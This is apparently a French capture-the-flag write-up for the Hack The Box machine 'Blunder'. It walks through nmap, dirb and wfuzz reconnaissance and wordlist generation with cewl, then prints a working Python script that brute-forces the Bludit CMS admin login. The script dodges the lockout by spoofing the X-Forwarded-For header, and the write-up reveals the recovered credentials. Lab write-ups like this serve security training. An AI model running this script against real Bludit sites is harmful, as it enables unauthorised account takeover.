# BLUNDER


## NMAP

Tout d'abord on fait un namp : `nmap -sC -sV -oN nmap 10.10.10.191
```
# Nmap 7.80 scan initiated Tue Jun  2 21:02:49 2020 as: nmap -sC -sV -oN nmap 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  2 21:05:15 2020 -- 1 IP address (1 host up) scanned in 146.22 seconds
```

## Dirb

On liste les directory du site : `dirb http://10.10.10.191/ -o dirb-tree.txt`
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb-tree.tx
START_TIME: Tue Jun  9 19:06:26 2020
URL_BASE: http://10.10.10.191/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.191/ ----
+ http://10.10.10.191/0 (CODE:200|SIZE:7562)
+ http://10.10.10.191/about (CODE:200|SIZE:3281)
==> DIRECTORY: http://10.10.10.191/admin/
+ http://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)
+ http://10.10.10.191/LICENSE (CODE:200|SIZE:1083)
+ http://10.10.10.191/robots.txt (CODE:200|SIZE:22)
+ http://10.10.10.191/server-status (CODE:403|SIZE:277)
```

## WFUZZ

On peut essayer aussi avec l'outil wfuzz : `wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 403,404 -u http://10.10.10.191/FUZZ.txt -t 50`
Ici wfuzz va chercher tous les fichiers commencant par les mots dans la wordlist et se finissant par .txt.
Ce qui nous donne :
```
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 4614

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                      
===================================================================

000003435:   200        1 L      4 W      22 Ch       "robots"                                                                                                                     
000004079:   200        4 L      23 W     118 Ch      "todo"                                                                                                                       

Total time: 71.69578
Processed Requests: 4614
Filtered Requests: 4612
Requests/sec.: 64.35524
```

On trouve le fichier todo, on va dedans et on trouve un username : fergus


## Sur la page Internet
On va sur http://10.10.10.191/admin/
On voit que c'est un CMS, Bludit.

En cherchant dans le code source de la page, on trouve la version 3.9.2.
Et on cherche des exploits sur Bludit.

On trouve beaucoup de brute-force.

On voit que le site est assez bizzare, on va donc generer une wordlist avec les mot du site avec la commande : `cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/`

On prend un script (python3 de préférence car le python c'est bien ;))
```python3
#!/usr/bin/env python3

import re
import requests

host = "http://10.10.10.191" # change to the appropriate URL

login_url = host + '/admin/login'
username = 'fergus' # Change to the appropriate username
fname = "/home/user/Documents/HTB/Blunder/wordlist.txt" #change this to the appropriate file you can specify the full path to the file

with open(fname) as f:
    content = f.readlines()
    word1 = [x.strip() for x in content] 
wordlist = word1

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

Une fois lancé on trouve le mot de passe : RolandDeschain



